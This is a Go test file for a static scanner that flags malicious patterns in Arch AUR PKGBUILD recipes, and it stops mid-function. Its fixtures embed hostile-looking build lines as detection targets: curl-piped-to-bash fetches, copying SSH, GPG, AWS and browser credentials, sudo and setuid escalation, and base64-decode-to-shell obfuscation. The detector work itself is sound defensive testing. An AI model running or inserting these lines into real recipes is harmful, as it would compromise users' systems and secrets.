// internal/check/pkgbuild_test.go
//
// Every rule in pkgbuild.go is exercised as a PAIR: a positive fixture that
// must trip it and a negative fixture, taken from the measured corpus wherever
// one exists, that must not. A rule with only a positive test is a rule whose
// false-positive rate is unmeasured, and that is the failure mode this project
// cannot afford.
package check

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"

	"github.com/lookatitude/aurvet/internal/finding"
	"github.com/lookatitude/aurvet/internal/pkgbuild"
)

// analyse runs the whole real pipeline -- Lex, Resolve, Assess, PKGBUILD -- on
// one recipe. Nothing is stubbed: the exclusions the rules depend on (comments,
// dependency arrays, heredoc bodies) are properties of the tokeniser, so a test
// that hand-built a File would be testing a different program.
func analyse(t *testing.T, src string) finding.Result {
	t.Helper()
	f := pkgbuild.Lex([]byte(src))
	r := pkgbuild.Resolve(f, pkgbuild.ResolveConfig{})
	v := pkgbuild.Assess("", f, r)
	return PKGBUILD(f, r, v, PKGBUILDConfig{})
}

// ruleIDs lists the rule IDs of every finding, for readable assertion failures.
func ruleIDs(res finding.Result) []string {
	var out []string
	for _, f := range res.Findings {
		out = append(out, f.RuleID)
	}
	return out
}

// hits counts findings of one rule.
func hits(res finding.Result, rule string) int {
	var n int
	for _, f := range res.Findings {
		if f.RuleID == rule {
			n++
		}
	}
	return n
}

// find returns the first finding of one rule.
func find(t *testing.T, res finding.Result, rule string) finding.Finding {
	t.Helper()
	for _, f := range res.Findings {
		if f.RuleID == rule {
			return f
		}
	}
	t.Fatalf("no %s finding; got %v", rule, ruleIDs(res))
	return finding.Finding{}
}

// wantSilent asserts the rules produced no findings at all. Gaps are allowed
// and expected: a fixture with an unresolvable value is a coverage gap (INV-9),
// which is precisely not a finding.
func wantSilent(t *testing.T, name string, res finding.Result) {
	t.Helper()
	if len(res.Findings) != 0 {
		for _, f := range res.Findings {
			t.Errorf("%s: unexpected %s (%s) on %s: %v", name, f.RuleID, f.Severity, f.Subject, f.Evidence)
		}
	}
}

// mustSeverity asserts a rule fires at exactly one severity.
func mustSeverity(t *testing.T, f finding.Finding, want finding.Severity) {
	t.Helper()
	if f.Severity != want {
		t.Errorf("%s severity = %s, want %s", f.RuleID, f.Severity, want)
	}
}

// ordinary is the shape of an unremarkable -bin recipe: a fixed URL with a real
// sha256, a package() that writes only under $pkgdir, and an absolute symlink
// TARGET (which is not a write). Every negative case is built from it so a
// finding can only come from the line under test.
const ordinary = `# Maintainer: someone <someone@example.com>
pkgname=ordinary-bin
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url="https://example.org/ordinary"
license=('MIT')
depends=('gtk3')
source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")
sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')
package() {
  install -Dm755 "$srcdir/ordinary" "$pkgdir/usr/bin/ordinary"
  ln -s /opt/ordinary/ordinary "$pkgdir/usr/bin/ordinary-alias"
}
`

// TestPKGBUILDOrdinaryRecipeIsSilent is the floor every other negative test
// stands on: if the baseline fixture fires, no negative assertion below means
// anything.
func TestPKGBUILDOrdinaryRecipeIsSilent(t *testing.T) {
	wantSilent(t, "ordinary", analyse(t, ordinary))
}

// TestPKGBUILDCorpusFixturesAreSilent runs the rules over the checked-in
// excerpts of the real cache. These are ordinary AUR recipes; a finding here is
// a false positive by construction.
func TestPKGBUILDCorpusFixturesAreSilent(t *testing.T) {
	dir := filepath.Join("..", "..", "testdata", "pkgbuild")
	entries, err := filepath.Glob(filepath.Join(dir, "*.pkgbuild"))
	if err != nil || len(entries) == 0 {
		t.Fatalf("no fixtures under %s (%v)", dir, err)
	}
	for _, p := range entries {
		src, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		wantSilent(t, filepath.Base(p), analyse(t, string(src)))
	}
}

// --- network fetch -------------------------------------------------------

func TestPKGBUILDNetworkFetchInBuild(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  curl -fsSL https://example.net/stage2.sh | bash\n}\n\npackage() {", 1)
	res := analyse(t, src)
	f := find(t, res, ruleNetFetch)
	mustSeverity(t, f, finding.SevCritical)
	joined := strings.Join(f.Evidence, "|")
	if !strings.Contains(joined, "curl") {
		t.Errorf("evidence does not name the tool: %v", f.Evidence)
	}
	if !strings.Contains(joined, "build") {
		t.Errorf("evidence does not name the function: %v", f.Evidence)
	}
	if !strings.Contains(strings.ToLower(joined), "shell") {
		t.Errorf("piping into bash is not reported: %v", f.Evidence)
	}
}

// TestPKGBUILDNetworkFetchInCommandSubstitution: the value of $( ) is
// unknowable without running it, but its TEXT is right there.
func TestPKGBUILDNetworkFetchInCommandSubstitution(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  local v=$(wget -qO- https://example.net/v)\n}\n\npackage() {", 1)
	res := analyse(t, src)
	if hits(res, ruleNetFetch) != 1 {
		t.Fatalf("wget inside $( ) not reported once: %v", ruleIDs(res))
	}
}

// TestPKGBUILDNetworkFetchExclusionsAreLoadBearing is the measured
// false-positive pair from the real corpus: google-chrome carries `curl` in a
// COMMENT and flutter carries the dependency string "curl" in an array. Both
// must be silent -- and the same fixture is then scanned as raw text to prove
// the exclusions are doing the work rather than being incidentally satisfied.
func TestPKGBUILDNetworkFetchExclusionsAreLoadBearing(t *testing.T) {
	src := `pkgname=fp-corpus
pkgver=1.0.0
arch=('x86_64')
url="https://example.org/fp"
# or use: $ curl -sSf https://dl.example.org/Packages | grep -A1 "Package: x"
optdepends=(
	"curl"
	'wget: for the other downloader'
)
source=("https://github.com/example/fp/archive/v${pkgver}.tar.gz")
sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')
build() {
  make
}
`
	wantSilent(t, "comment-and-dependency-array", analyse(t, src))

	// The mutation, run as a test rather than as an edit to the rule: a
	// text-scanning implementation of the same rule. If this does not find both
	// hits, the fixture no longer reproduces the corpus false positives and the
	// silence above proves nothing.
	naive := regexp.MustCompile(`\b(curl|wget)\b`)
	if n := len(naive.FindAllString(src, -1)); n != 3 {
		t.Fatalf("raw-text scan found %d curl/wget mentions, want 3 (one comment, two dependency-array entries); "+
			"the fixture no longer reproduces the corpus false positives", n)
	}
}

// TestPKGBUILDPackageManagerFetchIsNotReported pins a deliberate
// non-detection. go mod download, cargo fetch, npm install and yarn all reach
// the network at build time and all appear in 6 of the 34 measured benign
// recipes; reporting them as critical would cry wolf on a fifth of the corpus.
func TestPKGBUILDPackageManagerFetchIsNotReported(t *testing.T) {
	src := strings.Replace(ordinary, "package() {", `build() {
  go mod download -modcacherw -x
  go mod verify
  cargo fetch --target x86_64-unknown-linux-gnu
  npm install --omit=dev
  yarn build
}

package() {`, 1)
	wantSilent(t, "package-manager fetch", analyse(t, src))
}

func TestPKGBUILDVCSCloneIsSuspiciousNotCritical(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"prepare() {\n  git clone https://example.net/other.git other\n}\n\npackage() {", 1)
	res := analyse(t, src)
	mustSeverity(t, find(t, res, ruleVCSClone), finding.SevSuspicious)
	if hits(res, ruleNetFetch) != 0 {
		t.Errorf("git clone must not also fire the fetch rule: %v", ruleIDs(res))
	}
}

// TestPKGBUILDGitSubmoduleIsNotReported: `git submodule update --init` is
// ordinary in prepare() and is not a clone of something outside source=().
func TestPKGBUILDGitSubmoduleIsNotReported(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"prepare() {\n  cd \"$srcdir/ordinary\"\n  git submodule update --init --recursive\n  git describe --tags\n}\n\npackage() {", 1)
	wantSilent(t, "git submodule", analyse(t, src))
}

// --- writes outside $pkgdir ---------------------------------------------

func TestPKGBUILDWriteOutsidePkgdir(t *testing.T) {
	for _, tc := range []struct{ name, line string }{
		{"install to /usr", `install -Dm755 ordinary /usr/bin/ordinary`},
		{"cp to /etc", `cp ordinary.conf /etc/ordinary.conf`},
		{"install -t outside", `install -d -t /opt/ordinary`},
		{"mkdir in HOME", `mkdir -p "$HOME/.config/ordinary"`},
		{"tee tilde", `tee ~/.bashrc`},
		{"tar -C absolute", `tar -C /opt -xf ordinary.tar.gz`},
		{"sed -i outside", `sed -i s/a/b/ /etc/pacman.conf`},
		{"dd of= outside", `dd if=ordinary of=/boot/ordinary.img`},
	} {
		src := strings.Replace(ordinary, `  install -Dm755 "$srcdir/ordinary"`, "  "+tc.line+"\n  install -Dm755 \"$srcdir/ordinary\"", 1)
		res := analyse(t, src)
		if hits(res, ruleWriteOutside) == 0 {
			t.Errorf("%s: not reported: %v", tc.name, ruleIDs(res))
			continue
		}
		mustSeverity(t, find(t, res, ruleWriteOutside), finding.SevCritical)
	}
}

// TestPKGBUILDWritesUnderPkgdirAreSilent uses the shapes measured in the
// corpus, including the one that a naive rule gets wrong: `ln -s /opt/x
// "$pkgdir/usr/bin/y"` has an ABSOLUTE first argument that is a link target,
// not a destination (android-studio, antigravity, cursor-bin, dart-sdk-dev,
// rancher-desktop, visual-studio-code-bin -- 6 of 34).
func TestPKGBUILDWritesUnderPkgdirAreSilent(t *testing.T) {
	src := strings.Replace(ordinary, "package() {", `package() {
  install -d "$pkgdir/usr/share/licenses/ordinary"
  install -Dm644 LICENSE "$pkgdir/usr/share/licenses/ordinary/LICENSE"
  ln -s /opt/ordinary/ordinary "$pkgdir/usr/bin/ordinary"
  ln -sf /usr/bin/node resources/helpers/node
  ln -s /opt/ordinary/LICENSE -t "$pkgdir/usr/share/licenses/ordinary"
  cp -r usr "$pkgdir/"
  chmod -R ugo+rX $pkgdir/opt
  find "$pkgdir" -type d -exec chmod 755 {} +
  tar -C "$pkgdir" -xf ordinary.tar.gz
  mkdir -p "$srcdir/build"
  rm -rf "$pkgdir/usr/share/doc"
  sed -i s/a/b/ "$pkgdir/usr/bin/ordinary"`, 1)
	wantSilent(t, "writes under pkgdir", analyse(t, src))
}

// TestPKGBUILDSedExpressionIsNotADestination is a corpus regression: this rule's
// only false positive over the 34 cached recipes was google-chrome's
//
//	sed -i -e "/Exec=/i\StartupWMClass=Google-chrome" -e "s|x|y|" "$pkgdir"/...
//
// where the sed ADDRESS `/Exec=/i\...` begins with a slash because it is an
// address, not a path.
func TestPKGBUILDSedExpressionIsNotADestination(t *testing.T) {
	src := strings.Replace(ordinary, "package() {", `package() {
  sed -i -e "/Exec=/i\StartupWMClass=Google-chrome" -e "s/x-scheme-handler\/ftp;\?//g" "$pkgdir"/usr/share/applications/ordinary.desktop
  sed -i 's/^Icon=.*/Icon=ordinary/' "$pkgdir/usr/share/applications/ordinary.desktop"`, 1)
	wantSilent(t, "sed -i expressions", analyse(t, src))
}

// --- credential paths ----------------------------------------------------

func TestPKGBUILDCredentialPath(t *testing.T) {
	for _, tc := range []struct{ name, line string }{
		{"ssh key", `cp ~/.ssh/id_rsa "$srcdir/k"`},
		{"gnupg", `tar -cf keys.tar "$HOME/.gnupg"`},
		{"aws", `cat /home/build/.aws/credentials`},
		{"browser profile", `cp -r ~/.mozilla/firefox "$srcdir/p"`},
		{"keyring", `cp ~/.local/share/keyrings/login.keyring .`},
	} {
		src := strings.Replace(ordinary, "package() {",
			"build() {\n  "+tc.line+"\n}\n\npackage() {", 1)
		res := analyse(t, src)
		if hits(res, ruleCredential) == 0 {
			t.Errorf("%s: not reported: %v", tc.name, ruleIDs(res))
			continue
		}
		mustSeverity(t, find(t, res, ruleCredential), finding.SevCritical)
	}
}

// TestPKGBUILDCredentialNegatives: `gnome-keyring` is a PACKAGE NAME in
// depends/optdepends on 3 of the 34 measured recipes (google-chrome,
// tableplus, brave-bin), and a dotfile shipped INTO $pkgdir is package content,
// not a credential read.
func TestPKGBUILDCredentialNegatives(t *testing.T) {
	src := strings.Replace(ordinary, "depends=('gtk3')", `depends=('gtksourceview3' 'libgee' 'gnome-keyring')
optdepends=('gnome-keyring: for storing passwords in GNOME keyring'
	'libgnome-keyring: Enable GNOME keyring support')`, 1)
	src = strings.Replace(src, "package() {", `package() {
  install -Dm644 gpg.conf "$pkgdir/etc/skel/.gnupg/gpg.conf"
  install -Dm644 ssh_config "$pkgdir/etc/ssh/ssh_config"`, 1)
	wantSilent(t, "keyring dependency and packaged dotfiles", analyse(t, src))
}

// --- privilege escalation ------------------------------------------------

func TestPKGBUILDPrivilegeEscalation(t *testing.T) {
	for _, tc := range []struct{ name, line string }{
		{"sudo", `sudo cp ordinary /usr/bin/ordinary`},
		{"pkexec", `pkexec /usr/bin/ordinary-setup`},
		{"doas", `doas make install`},
		{"setuid chmod outside pkgdir", `chmod u+s /usr/bin/ordinary`},
		{"numeric setuid outside pkgdir", `chmod 4755 /usr/bin/ordinary`},
		{"setcap outside pkgdir", `setcap cap_net_raw+ep /usr/bin/ordinary`},
	} {
		src := strings.Replace(ordinary, "package() {",
			"build() {\n  "+tc.line+"\n}\n\npackage() {", 1)
		res := analyse(t, src)
		if hits(res, rulePrivEsc) == 0 {
			t.Errorf("%s: not reported: %v", tc.name, ruleIDs(res))
			continue
		}
		mustSeverity(t, find(t, res, rulePrivEsc), finding.SevCritical)
	}
}

// TestPKGBUILDSetuidUnderPkgdirIsSilent is measured, not hypothetical:
// brave-bin ships `chmod 4755 "$pkgdir/opt/brave-bin/chrome-sandbox"` and
// visual-studio-code-bin ships `chmod u-s`. A setuid bit applied to packaged
// CONTENT is not privilege escalation of the BUILD; the installed setuid file
// is P1-C's business (integrity-unowned-setuid), not this rule's.
func TestPKGBUILDSetuidUnderPkgdirIsSilent(t *testing.T) {
	src := strings.Replace(ordinary, "package() {", `package() {
  chmod 4755 "$pkgdir/opt/ordinary/chrome-sandbox"
  chmod u+s "${pkgdir}/opt/ordinary/helper"
  chmod u-s "${pkgdir}/usr/share/ordinary/chrome-sandbox"
  chmod -R u+rwX,go+rX,go-w "$pkgdir"
  chmod 755 $pkgdir/usr/local/bin/ordinary`, 1)
	wantSilent(t, "setuid under pkgdir", analyse(t, src))
}

// TestPKGBUILDSudoAsDependencyIsSilent: yay's own optdepends carry
// 'sudo: privilege elevation' and 'doas: privilege elevation'.
func TestPKGBUILDSudoAsDependencyIsSilent(t *testing.T) {
	src := strings.Replace(ordinary, "depends=('gtk3')", `optdepends=(
  'sudo: privilege elevation'
  'doas: privilege elevation'
)`, 1)
	wantSilent(t, "sudo as a dependency", analyse(t, src))
}

// --- paste-site and bare-IP hosts ---------------------------------------

func TestPKGBUILDPasteHost(t *testing.T) {
	for _, tc := range []struct{ name, url string }{
		{"0x0.st", "https://0x0.st/aBcD.tar.gz"},
		{"pastebin", "https://pastebin.com/raw/aBcDeFgH"},
		{"gist", "https://gist.githubusercontent.com/x/y/raw/z/patch.diff"},
		{"shortener", "https://bit.ly/3xYzAbC"},
		{"bare ipv4", "http://203.0.113.7/ordinary.tar.gz"},
		{"decimal ip", "http://3232235521/ordinary.tar.gz"},
	} {
		src := strings.Replace(ordinary,
			`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
			`source=("`+tc.url+`")`, 1)
		res := analyse(t, src)
		if hits(res, rulePasteHost) == 0 {
			t.Errorf("%s: not reported: %v", tc.name, ruleIDs(res))
			continue
		}
		mustSeverity(t, find(t, res, rulePasteHost), finding.SevCritical)
	}
}

// TestPKGBUILDBareIPv6SourceIsAGapNotSilence pins the honest handling of an
// entry the resolver cannot decompose: parseSourceEntry cuts on the FIRST "::",
// which in `http://[2001:db8::1]/x.tar.gz` falls inside the IPv6 authority
// rather than on the rename separator, so the entry arrives with no scheme and
// no host and the host check cannot run. Under INV-9 that is a coverage gap,
// never a pass and never a critical invented from a value we do not have.
//
// The first-"::" cut is NOT a defect awaiting a fix -- it is what makepkg's own
// get_filename does, so this package agrees with the tool that performs the
// fetch. See the contract note on parseSourceEntry in
// internal/pkgbuild/resolve.go, and TestSourceEntrySplitMatchesMakepkg there,
// which fails if anyone "corrects" it. Making the parse more RFC-correct than
// makepkg would trade an admitted gap for a confidently wrong verdict.
func TestPKGBUILDBareIPv6SourceIsAGapNotSilence(t *testing.T) {
	src := strings.Replace(ordinary,
		`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
		`source=("http://[2001:db8::1]/ordinary.tar.gz")`, 1)
	res := analyse(t, src)
	if hits(res, rulePasteHost) != 0 {
		t.Errorf("a host that could not be extracted produced a finding: %v", res.Findings)
	}
	var gap bool
	for _, g := range res.Gaps {
		if g.RuleID == rulePasteHost {
			gap = true
			if !strings.Contains(g.Reason, "://") {
				t.Errorf("gap does not quote the entry: %q", g.Reason)
			}
		}
	}
	if !gap {
		t.Errorf("no %s coverage gap; the host check silently did not run: %v", rulePasteHost, res.Gaps)
	}
}

// TestPKGBUILDOrdinaryHostsAreSilent uses the hosts actually present in the
// corpus, raw.githubusercontent.com included -- it is not a gist and must not
// be treated as one.
func TestPKGBUILDOrdinaryHostsAreSilent(t *testing.T) {
	for _, host := range []string{
		"https://github.com/example/x/releases/download/v1/x.tar.gz",
		"https://raw.githubusercontent.com/example/x/main/x.sh",
		"https://storage.googleapis.com/example/x.zip",
		"https://dl.google.com/linux/chrome/x.deb",
		"https://files.pythonhosted.org/packages/source/x/x-1.0.tar.gz",
		"https://aur.archlinux.org/cgit/aur.git/x.patch",
		"http://download.brother.com/welcome/x.rpm",
	} {
		src := strings.Replace(ordinary,
			`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
			`source=("`+host+`")`, 1)
		wantSilent(t, host, analyse(t, src))
	}
}

// --- obfuscation ---------------------------------------------------------

func TestPKGBUILDObfuscation(t *testing.T) {
	for _, tc := range []struct{ name, line string }{
		{"base64 -d", `echo aGVsbG8K | base64 -d > payload`},
		{"base64 --decode piped to sh", `base64 --decode payload.b64 | sh`},
		{"xxd -r", `xxd -r -p payload.hex > payload`},
		{"openssl enc -d", `openssl enc -d -aes-256-cbc -in payload.enc -out payload`},
		{"hex escapes", `printf '\x63\x75\x72\x6c\x20\x68\x74\x74\x70' > payload`},
		{"opaque token", `echo ` + strings.Repeat("QUJDRA", 25) + ` > payload`},
	} {
		src := strings.Replace(ordinary, "package() {",
			"build() {\n  "+tc.line+"\n}\n\npackage() {", 1)
		res := analyse(t, src)
		if hits(res, ruleObfuscation) == 0 {
			t.Errorf("%s: not reported: %v", tc.name, ruleIDs(res))
			continue
		}
		mustSeverity(t, find(t, res, ruleObfuscation), finding.SevCritical)
	}
}

// TestPKGBUILDObfuscationNegatives: encoding is not decoding, gzip is not
// obfuscation, and a long sha512 lives in an ASSIGNMENT, which no rule reads.
func TestPKGBUILDObfuscationNegatives(t *testing.T) {
	src := strings.Replace(ordinary, "sha256sums=", `sha512sums=('cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e')
b2sums=('786a02f742015903c6c6fd852552d272912f4740e15847618a86e217f71f5419d25e1031afee585313896444934eb04b903a685b1448b755d56f701afe9be2ce')
_ignored=`, 1)
	src = strings.Replace(src, "package() {", `build() {
  echo hello | base64 > encoded.txt
  gzip -d ordinary.tar.gz
  tar -xJf ordinary.tar.xz
  go build -v -o build/ordinary -ldflags "-X main.version=1.0.0 -linkmode=external"
}

package() {`, 1)
	wantSilent(t, "encoding and compression", analyse(t, src))
}

// --- SKIP / weak integrity ----------------------------------------------

func TestPKGBUILDSkipOnFixedURL(t *testing.T) {
	src := strings.Replace(ordinary,
		`sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')`,
		`sha256sums=('SKIP')`, 1)
	res := analyse(t, src)
	f := find(t, res, ruleSkipIntegrity)
	mustSeverity(t, f, finding.SevSuspicious)
	if !strings.Contains(strings.Join(f.Evidence, "|"), "github.com") {
		t.Errorf("evidence does not quote the unverified URL: %v", f.Evidence)
	}
}

// TestPKGBUILDSkipOnVCSSourceIsSilent is the distinction that decides whether
// this rule fires on most -git packages: SKIP is MANDATORY for a VCS source.
// viewmd (measured) is exactly this shape.
func TestPKGBUILDSkipOnVCSSourceIsSilent(t *testing.T) {
	src := strings.Replace(ordinary,
		`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
		`source=("$pkgname::git+$url.git")`, 1)
	src = strings.Replace(src,
		`sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')`,
		`sha256sums=('SKIP')`, 1)
	wantSilent(t, "SKIP on a git source", analyse(t, src))
}

// TestPKGBUILDMD5OnlyIsBelowTheDefaultFloor records a deliberate deviation from
// spec §5.2, which rates MD5-only integrity on a fixed URL `suspicious`.
// Measured: 3 of the 34 cached recipes (brscan4, nperf-gui-appimage,
// flutter-bin) are md5-only on a fixed URL, so at `suspicious` this rule would
// fire on 9% of an honest corpus and dominate the default floor. It is reported
// at info -- fully visible, still reachable with --min-severity info -- exactly
// as aur-submitter-mismatch was for the same measured reason.
func TestPKGBUILDMD5OnlyIsBelowTheDefaultFloor(t *testing.T) {
	src := strings.Replace(ordinary,
		`sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')`,
		`md5sums=('dfa4b6419f2fae2992595701d0735ff5')`, 1)
	res := analyse(t, src)
	f := find(t, res, ruleWeakIntegrity)
	mustSeverity(t, f, finding.SevInfo)
	if res.MaxSeverity() != finding.SevInfo {
		t.Errorf("md5-only raised the run above info: %s", res.MaxSeverity())
	}
}

// TestPKGBUILDLocalSourceWithoutStrongSumIsSilent: a local file ships beside
// the PKGBUILD in the same AUR repository, so there is no fetch to substitute.
func TestPKGBUILDLocalSourceWithoutStrongSumIsSilent(t *testing.T) {
	src := strings.Replace(ordinary,
		`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
		`source=(ordinary.desktop)`, 1)
	src = strings.Replace(src,
		`sha256sums=('7d3c0f9b2a1e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8b9a0f1e2d3c4b5a6f7e8d9c')`,
		`sha256sums=('SKIP')`, 1)
	wantSilent(t, "local source", analyse(t, src))
}

// --- coverage, limits and bounds ----------------------------------------

// TestPKGBUILDMergesCoverageGaps: INV-3/INV-9. The verdict's gaps must arrive
// in the Result, or a caller reading only Findings reports an eval-generated
// recipe as clean.
func TestPKGBUILDMergesCoverageGaps(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  eval \"package_ordinary() { install -Dm755 x \\\"$pkgdir/usr/bin/x\\\"; }\"\n}\n\npackage() {", 1)
	f := pkgbuild.Lex([]byte(src))
	r := pkgbuild.Resolve(f, pkgbuild.ResolveConfig{})
	v := pkgbuild.Assess("ordinary-bin", f, r)
	res := PKGBUILD(f, r, v, PKGBUILDConfig{})
	if len(v.Gaps) == 0 {
		t.Fatal("fixture produced no verdict gaps; it no longer exercises the merge")
	}
	if res.Complete() {
		t.Error("a recipe with coverage gaps must not report complete")
	}
	if len(res.Gaps) < len(v.Gaps) {
		t.Errorf("Result carries %d gaps, verdict had %d", len(res.Gaps), len(v.Gaps))
	}
	if hits(res, "pkgbuild-eval") != 0 {
		t.Error("eval must not produce a finding; it is a coverage gap (3 of 34 honest recipes)")
	}
}

// TestPKGBUILDEvalFloorIsStatedInTheFinding: INV-6 requires the limit in the
// OUTPUT, not only in a comment.
func TestPKGBUILDEvalFloorIsStatedInTheFinding(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  eval \"$(echo true)\"\n  curl -fsSL https://example.net/x -o x\n}\n\npackage() {", 1)
	res := analyse(t, src)
	f := find(t, res, ruleNetFetch)
	if !strings.Contains(f.Limits, "eval") {
		t.Errorf("finding limits do not mention the eval floor: %q", f.Limits)
	}
	if !strings.Contains(f.Limits, "never executed") && !strings.Contains(f.Limits, "not executed") {
		t.Errorf("finding limits do not state that the recipe was never run: %q", f.Limits)
	}
}

// TestPKGBUILDRedirectionBlindSpotIsDeclared: the tokeniser consumes a
// redirection TARGET as an operator operand, so `echo x > /etc/ld.so.preload`
// is invisible to the write rule. That is a real hole and it is declared in the
// rule's limits rather than left for a reader to discover.
func TestPKGBUILDRedirectionBlindSpotIsDeclared(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  install -Dm755 x /usr/bin/x\n}\n\npackage() {", 1)
	f := find(t, analyse(t, src), ruleWriteOutside)
	if !strings.Contains(f.Limits, "redirection") {
		t.Errorf("write-rule limits do not declare the redirection blind spot: %q", f.Limits)
	}
}

// TestPKGBUILDFindingsAreBounded: the input is attacker-controlled, so an
// unbounded report is a denial of service against the person reading it. The
// truncation is itself a coverage gap, never a silent cut.
func TestPKGBUILDFindingsAreBounded(t *testing.T) {
	var b strings.Builder
	b.WriteString("pkgname=flood\npkgver=1\narch=('x86_64')\nbuild() {\n")
	for i := 0; i < 5000; i++ {
		b.WriteString("  curl -fsSL https://example.net/x -o x\n")
	}
	b.WriteString("}\n")
	res := analyse(t, b.String())
	if n := hits(res, ruleNetFetch); n > maxPKGBUILDFindings {
		t.Errorf("%d fetch findings, bound is %d", n, maxPKGBUILDFindings)
	}
	if res.Complete() {
		t.Error("a truncated report must be an incomplete one")
	}
}

// TestPKGBUILDIsPure: INV-4. The same inputs must produce the same evidence,
// with no dependence on CWD, environment or GOARCH.
func TestPKGBUILDIsPure(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  curl -fsSL https://0x0.st/x | bash\n  sudo chmod u+s /usr/bin/x\n}\n\npackage() {", 1)
	a := analyse(t, src)
	b := analyse(t, src)
	if len(a.Findings) != len(b.Findings) || len(a.Gaps) != len(b.Gaps) {
		t.Fatalf("unstable result: %d/%d vs %d/%d", len(a.Findings), len(a.Gaps), len(b.Findings), len(b.Gaps))
	}
	for i := range a.Findings {
		if a.Findings[i].RuleID != b.Findings[i].RuleID ||
			strings.Join(a.Findings[i].Evidence, "|") != strings.Join(b.Findings[i].Evidence, "|") {
			t.Errorf("finding %d differs between runs", i)
		}
	}
	if len(a.Findings) == 0 {
		t.Fatal("fixture produced no findings; determinism assertion is vacuous")
	}
}

// TestPKGBUILDSubjectIsVersionIndependent: findings are keyed on pkgbase so a
// suppression survives an upgrade (finding.Fingerprint's contract).
func TestPKGBUILDSubjectIsVersionIndependent(t *testing.T) {
	src := strings.Replace(ordinary, "package() {",
		"build() {\n  curl -fsSL https://example.net/x -o x\n}\n\npackage() {", 1)
	f := find(t, analyse(t, src), ruleNetFetch)
	if f.Subject != "ordinary-bin" {
		t.Errorf("subject = %q, want the pkgbase", f.Subject)
	}
	if strings.Contains(f.Subject, "1.0.0") {
		t.Errorf("subject carries a version: %q", f.Subject)
	}
	if f.SubjectKind != "pkgbase" {
		t.Errorf("subject kind = %q, want pkgbase", f.SubjectKind)
	}
}

// TestPKGBUILDEmptyInputIsNotClean: INV-3. Bytes that are not a recipe must not
// report clean.
func TestPKGBUILDEmptyInputIsNotClean(t *testing.T) {
	for _, src := range []string{"", "# nothing but a comment\n", "\x00\x00\x00"} {
		res := analyse(t, src)
		if res.Complete() {
			t.Errorf("%q reported complete coverage", src)
		}
		for _, f := range res.Findings {
			if f.Severity == finding.SevCritical {
				t.Errorf("%q produced a critical: %s", src, f.RuleID)
			}
		}
	}
}

// TestPKGBUILDUnresolvableSourceIsAGapNotACritical: INV-9.
func TestPKGBUILDUnresolvableSourceIsAGapNotACritical(t *testing.T) {
	src := strings.Replace(ordinary,
		`source=("https://github.com/example/ordinary/releases/download/v${pkgver}/ordinary.tar.gz")`,
		`source=("https://${_mirror}/$(get_path)/ordinary.tar.gz")`, 1)
	res := analyse(t, src)
	if res.Complete() {
		t.Fatal("an unresolvable source must be a coverage gap")
	}
	for _, f := range res.Findings {
		if f.Severity == finding.SevCritical {
			t.Errorf("unresolvable input produced a critical: %s (%v)", f.RuleID, f.Evidence)
		}
	}
}

// TestPKGBUILDLiveCorpus runs every rule over the real helper cache. The target
// is ZERO findings: these are ordinary AUR packages, so a hit is a rule defect
// until proven otherwise. Gated -- the cache is 88 GB and machine-specific.
func TestPKGBUILDLiveCorpus(t *testing.T) {
	if os.Getenv("AURVET_LIVE_PKGBUILD") != "1" {
		t.Skip("set AURVET_LIVE_PKGBUILD=1 to measure against the live helper cache")
	}
	dir := os.Getenv("AURVET_LIVE_PKGBUILD_DIR")
	if dir == "" {
		home, err := os.UserHomeDir()
		if err != nil {
			t.Fatal(err)
		}
		dir = filepath.Join(home, ".cache", "yay")
	}
	paths, err := filepath.Glob(filepath.Join(dir, "*", "PKGBUILD"))
	if err != nil || len(paths) == 0 {
		t.Skipf("no PKGBUILDs under %s (%v)", dir, err)
	}
	perRule := map[string]int{}
	var recipes, findings, atFloor int
	for _, p := range paths {
		src, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		recipes++
		res := analyse(t, string(src))
		for _, f := range res.Findings {
			perRule[f.RuleID]++
			findings++
			if f.Severity >= finding.SevSuspicious {
				atFloor++
			}
			t.Logf("%-40s %-34s %-10s %v", filepath.Base(filepath.Dir(p)), f.RuleID, f.Severity, f.Evidence)
		}
	}
	t.Logf("corpus=%d findings=%d at-or-above-default-floor=%d", recipes, findings, atFloor)
	for _, rule := range allPKGBUILDRules {
		t.Logf("%-34s %d", rule, perRule[rule])
	}
	// The gate is the DEFAULT FLOOR (suspicious). Below it, pkgbuild-weak-integrity
	// reports the measured md5/sha1-only recipes at info -- deliberately, and
	// documented on the rule itself -- so counting those as failures here would
	// contradict the downgrade that keeps the floor clean.
	if atFloor != 0 {
